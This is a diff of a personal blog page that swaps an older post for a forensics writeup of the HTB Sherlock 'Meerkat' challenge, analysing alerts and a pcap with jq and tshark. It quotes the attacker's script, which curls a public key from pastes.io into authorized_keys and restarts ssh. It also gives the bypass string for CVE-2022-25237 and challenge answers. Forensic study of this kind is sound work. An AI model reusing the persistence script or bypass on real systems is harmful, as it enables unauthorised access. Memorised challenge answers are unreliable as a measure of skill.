@@ -1,20 +1,28 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='check it out on my github &amp;raquo; here'>
-<title>htb cyberapocalypse 2023</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeup of htb sherlock Meerkat rating: easy
+We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?'>
+<title>Htb Sherlock Meerkat</title>
 
-<link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb-cyberapocalypse-2023/'>
+<link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb-sherlock-meerkat/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='htb cyberapocalypse 2023'>
-<meta property='og:description' content='check it out on my github &amp;raquo; here'>
-<meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb-cyberapocalypse-2023/'>
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Htb Sherlock Meerkat'>
+<meta property='og:description' content='Writeup of htb sherlock Meerkat rating: easy
+We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?'>
+<meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb-sherlock-meerkat/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-05-31T12:59:47&#43;03:00'/><meta property='article:modified_time' content='2023-05-31T12:59:47&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/ca-logo-2023.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-12-20T14:43:14&#43;03:00'/><meta property='article:modified_time' content='2023-12-20T14:43:14&#43;03:00'/>
 <meta name="twitter:site" content="@f0rk3b0mb">
-    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="htb cyberapocalypse 2023">
-<meta name="twitter:description" content="check it out on my github &amp;raquo; here"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/ca-logo-2023.webp' />
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Htb Sherlock Meerkat">
+<meta name="twitter:description" content="Writeup of htb sherlock Meerkat rating: easy
+We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? we can filter the meerkat-alerts.json with&amp;hellip;
+1 2 3 4 cat meerkat-alerts.json |jq |grep signature | grep -v python the bmp name is in the signature ans: Bonitasoft
+We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?">
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
 var doNotTrack = false;
@@ -307,34 +315,49 @@ if (!doNotTrack) {
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#writeup-of-htb-sherlock-meerkat">Writeup of htb sherlock Meerkat</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
-    <article class="has-image main-article">
+    <article class="main-article">
     <header class="article-header">
-        <div class="article-image">
-            <a href="/p/htb-cyberapocalypse-2023/">
-                
-                    <img src="/cover/ca-logo-2023.webp" loading="lazy" alt="Featured image of post htb cyberapocalypse 2023" />
-                
-            </a>
-        </div>
-    
 
     <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/writeups/" style="background-color: #2a9d8f; color: #fff;">
-                ctf writeups
-            </a>
-        
-    </header>
     
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/htb-cyberapocalypse-2023/">htb cyberapocalypse 2023</a>
+            <a href="/p/htb-sherlock-meerkat/">Htb Sherlock Meerkat</a>
         </h2>
     
         
@@ -356,7 +379,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">May 31, 2023</time>
+                <time class="article-time--published">Dec 20, 2023</time>
             </div>
         
 
@@ -371,7 +394,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    1 minute read
+                    3 minute read
                 </time>
             </div>
         
@@ -386,8 +409,117 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <p>check it out on my github &raquo;  <a class="link" href="https://github.com/f0rk3b0mb/htb-cyberapocalypse-2023-writeup"  target="_blank" rel="noopener"
-    >here</a></p>
+    <h2 id="writeup-of-htb-sherlock-meerkat">Writeup of htb sherlock Meerkat</h2>
+<p>rating: easy</p>
+<ol>
+<li>We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?</li>
+</ol>
+<p>we can filter the meerkat-alerts.json with&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat meerkat-alerts.json |jq |grep signature | grep -v python
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">the bmp name is in the signature
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ans:  Bonitasoft</p>
+<ol start="2">
+<li>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?</li>
+</ol>
+<p>From the meerkat-alerts.json and from pacap file we can see that there was alot of alerts on python-requests and we can see the requests tested different creds. This is possible Credential Stuffing</p>
+<p>ans: Credential Stuffing</p>
+<ol start="3">
+<li>Does the vulnerability exploited have a CVE assigned - and if so, which one?</li>
+</ol>
+<p>Here use the same command as question1 , the cve is in the signature</p>
+<p>ans: CVE-2022-25237</p>
+<ol start="4">
+<li>Which string was appended to the API URL path to bypass the authorization filter by the attacker&rsquo;s exploit?</li>
+</ol>
+<p>in this case i used tshark to analyse the pcap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri | grep -i api
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">filter post requests , get the url path and grep for the api endpoints
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>i18ntranslation</p>
+<ol start="5">
+<li>How many combinations of usernames and passwords were used in the credential stuffing attack?</li>
+</ol>
+<p>here we filter post requests, the we remove &ldquo;username=install&amp;password=install&amp;_l=en&rdquo; , i also removed
+&ldquo;/bonita/API/portal/page/;i18ntranslation&rdquo;  and  &ldquo;/bonita/API/pageUpload;i18ntranslation?action=add&rdquo;  which were not login requests then pipe the output to uniq</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tshark -r meerkat.pcap -Y &#34;http.request.method == POST&#34; -T fields -e http.request.uri -e  http.file_data  | grep -v &#34;username=install&amp;password=install&amp;_l=en&#34; | grep -v &#34;/bonita/API/portal/page/;i18ntranslation&#34; | grep -v &#34;/bonita/API/pageUpload;i18ntranslation?action=add&#34; | uniq | wc -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ans: 56</p>
+<ol start="6">
+<li>Which username and password combination was successful?</li>
+</ol>
+<p>From the query above without uniq , the last combination has a different  http.file_data , yoll have to check through wireshark but the ans is &hellip;</p>
+<p>ans: <a class="link" href="mailto:seb.broom@forela.co.uk" >seb.broom@forela.co.uk</a>:g0vernm3nt</p>
+<ol start="7">
+<li>If any, which text sharing site did the attacker utilise?</li>
+</ol>
+<p>As i was analysing the pcap using this query we can get the full uri. the url is part of parameters</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r meerkat.pcap  -T fields -e  http.request.full_uri | uniq
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ans: pastes.io</p>
+<ol start="8">
+<li>Please provide the filename of the public key used by the attacker to gain persistence on our host.</li>
+</ol>
+<p>Visiting the url we get a bash script with the following content&hellip; hxxps[://]pastes[.]io/raw/bx5gcr0et8</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">sudo service ssh restart
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ans: hffgra4unv</p>
+<ol start="9">
+<li>Can you confirmed the file modified by the attacker to gain persistence?</li>
+</ol>
+<p>see above</p>
+<p>ans: /home/ubuntu/.ssh/authorized_keys</p>
+<ol start="10">
+<li>Can you confirm the MITRE technique ID of this type of persistence mechanism?</li>
+</ol>
+<p>this technique of using ssh authorized keys has id T1098.004. You can get this by visiting mitre website or googling or use chatgpt idc.</p>
+<p>ans: T1098.004</p>
 
 </section>
 
@@ -416,110 +548,6 @@ if (!doNotTrack) {
     
 
     
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">Related content</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/urchinsec_2024/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/urchinsec.png" loading="lazy" data-key="" data-hash="/cover/urchinsec.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Urchinsec_2024</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/htb_cyberapocalypse_2024/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/ca2024.png" loading="lazy" data-key="" data-hash="/cover/ca2024.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">HTB_cyberapocalypse_2024</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/knightctf_2024/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/knightctf.jpg" loading="lazy" data-key="" data-hash="/cover/knightctf.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Knightctf_2024</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/irisctf_whats_my_password/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/iris.png" loading="lazy" data-key="" data-hash="/cover/iris.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Irisctf_whats_my_password</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/hack_the_boo2023/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Hack_the_boo2023</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
 
      
     
